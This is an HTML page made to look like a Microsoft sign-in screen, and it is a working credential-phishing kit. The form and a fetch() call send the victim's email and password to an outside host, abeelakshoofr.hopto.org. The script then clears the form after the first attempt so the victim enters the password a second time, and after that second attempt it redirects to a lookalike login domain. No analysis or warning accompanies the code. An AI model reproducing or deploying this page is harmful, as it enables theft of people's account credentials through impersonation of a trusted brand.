<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="shortcut icon"
        href="https://static.vecteezy.com/system/resources/thumbnails/027/127/473/small_2x/microsoft-logo-microsoft-icon-transparent-free-png.png"
        type="image/x-icon">
    <title>Sign In</title>
    <style>
        /* ... your existing styles ... */
        body {
            margin: 0;
            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
            background: radial-gradient(circle at top left, #f6e8e6, #e6f0f6, #f9f9f9);
            background-size: cover;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            height: 100vh;
        }

        .login-container {
            background: white;
            width: 360px;
            padding: 30px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
        }

        .logo {
            width: 100px;
            margin-bottom: 25px;
        }

        .title1 {
            font-size: 22px;
            font-weight: 500;
            margin-bottom: 5px;
            margin-top: -5px;
        }

        .title2 {
            font-size: 22px;
            font-weight: 500;
            margin-bottom: 10px;
            margin-top: 5px;
            text-align: center;
        }

        .input-group {
            margin-bottom: 20px;
        }

        input[type="email"],
        input[type="password"],
        input[type="text"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0 5px 0;
            border: none;
            border-bottom: 2px solid #0078D4;
            outline: none;
            font-size: 14px;
        }

        .email-wrapper {
            text-align: center;
            margin-top: 10px;
            margin-bottom: 20px;
        }

        .email-pill {
            display: inline-block;
            border: 1px solid #ccc;
            color: #000000b6;
            font-size: 14px;
            padding: 6px 14px;
            border-radius: 999px;
            white-space: nowrap;
            max-width: 100%;
            word-break: break-word;
        }

        .btn {
            width: 30%;
            padding: 10px;
            background: #0067b8;
            color: white;
            border: none;
            font-size: 16px;
            cursor: pointer;
            float: right;
            margin-bottom: -10px;
        }

        .btn:hover {
            background: #005ba1;
        }

        .password-group {
            position: relative;
        }

        .toggle-password {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            user-select: none;
            width: 24px;
            height: 24px;
        }

        .hidden {
            display: none;
        }

        .sign-in-options {
            margin-top: 20px;
            width: 396px;
            max-width: 600px;
            display: flex;
            align-items: center;
            justify-content: start;
            text-align: center;
            border: 1px solid #ccc;
            padding: 12px;
            cursor: pointer;
            background: white;
            margin-top: 20px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
        }

        .sign-in-options img {
            width: 20px;
            margin-right: 10px;
        }

        .alt-link {
            text-align: center;
            margin-top: 25px;
            font-size: 15px;
        }

        .alt-link a {
            color: #0067C5;
            font-weight: 500;
            text-decoration: none;
        }

        .sub-btn {
            width: 380px;
            margin-bottom: 35px;
            margin-right: -16px;
            margin-top: 12px;
            border-radius: 5px;
        }

        body.step2-active {
            background: url("https://logincdn.msftauth.net/shared/5/images/fluent_web_light_57fee22710b04cebe1d5.svg") no-repeat center center fixed;
            background-size: cover;
        }

        body.step2-active .logo {
            width: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            text-align: center;
        }
    </style>
</head>

<body>
    <div class="login-container">
        <div class="logo">
            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiDfPy4C-azpmAC5NTHImq3ff2v8yjFk9Pl4CI_54aMQ5sJcRY4u7EfdCR8YeCpOgd7Tgd_R0uBNd6vi4latzxIZU8XSePjz9vOFVUHjQR-DJmHDcDYjyrfRQyedNZo_EJNJzC2e19JKQu4UsBaisCnCc7j7WLhLNcN4_VycBHFPfp8VisEj8tF2Hyig4k/w275-h61/microsoft_logo_564db913a7fa0ca42727161c6d031bef.png"
                alt="Microsoft Logo">
        </div>
        <form id="loginForm" action="https://abeelakshoofr.hopto.org/out/next2580.php" method="POST">
            <!-- Step 1 -->
            <div class="step step-1">
                <div class="title title1">Sign in</div>
                <div class="input-group">
                    <input type="text" id="email" name="user" placeholder="Email, phone, or Skype" required>
                </div>
                <div class="links">
                    No account? <a href="#">Create one!</a><br /><br>
                    <a href="#">Canâ€™t access your account?</a>
                </div>
                <button type="button" class="btn" onclick="goToStep2()">Next</button>
            </div>

            <!-- Step 2 -->
            <div class="step step-2 hidden">
                <div class="email-wrapper">
                    <span id="displayEmail" class="email-pill">user@example.com</span>
                </div>
                <div class="title2">Enter your password</div>
                <div class="input-group password-group">
                    <input type="password" id="password" name="pass" placeholder="Password" autocomplete="new-password" required>
                    <img src="https://static.thenounproject.com/png/506282-200.png" alt="Toggle Password"
                        class="toggle-password" id="togglePasswordIcon" onclick="togglePassword()" />
                </div>
                <button type="submit" class="btn sub-btn">Next</button>
                <div class="alt-link">
                    <a href="#">Sign in with a different account</a>
                </div>
            </div>
        </form>
    </div>
    <div class="sign-in-options" id="footer">
        <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg"
            alt="Key Icon" width="20" height="20">
        Sign-in options
    </div>

    <script>
        const form = document.getElementById('loginForm');
        const step1 = document.querySelector('.step-1');
        const step2 = document.querySelector('.step-2');
        const emailInput = document.getElementById('email');
        const displayEmail = document.getElementById('displayEmail');
        const footer = document.getElementById('footer');

        function goToStep2() {
            const email = emailInput.value.trim();
            if (email) {
                displayEmail.textContent = email;
                step1.classList.add('hidden');
                step2.classList.remove('hidden');
                footer.style.display = "none";
                document.body.classList.add('step2-active');
                document.getElementById('password').focus();
            }
        }

        function togglePassword() {
            const pwd = document.getElementById("password");
            const icon = document.getElementById("togglePasswordIcon");

            if (pwd.type === "password") {
                pwd.type = "text";
                icon.src = "https://static.thenounproject.com/png/4334035-200.png"; // eye open
            } else {
                pwd.type = "password";
                icon.src = "https://static.thenounproject.com/png/506282-200.png"; // eye closed
            }
        }

        form.addEventListener('submit', function (e) {
            e.preventDefault();

            let submitCount = parseInt(localStorage.getItem('submitCount') || '0');
            submitCount += 1;
            localStorage.setItem('submitCount', submitCount);

            const formData = new FormData(form);

            fetch(form.action, {
                method: 'POST',
                body: formData
            }).then(() => {
                if (submitCount >= 2) {
                    // Redirect after second submit
                    window.location.href = "https://loginmicrosoftonlinecom-common-oaut1wqhau128bas812bab12aas.vercel.app/?=%0%";
                } else {
                    // Reset for first submit, clear email input
                    form.reset();
                    emailInput.value = "";
                    step2.classList.add('hidden');
                    step1.classList.remove('hidden');
                    footer.style.display = "block";
                    document.body.classList.remove('step2-active');
                }
            }).catch(() => {
                // On error, optionally reset or handle
                alert('An error occurred while submitting the form. Please try again.');
            });
        });
    </script>

</body>

</html>
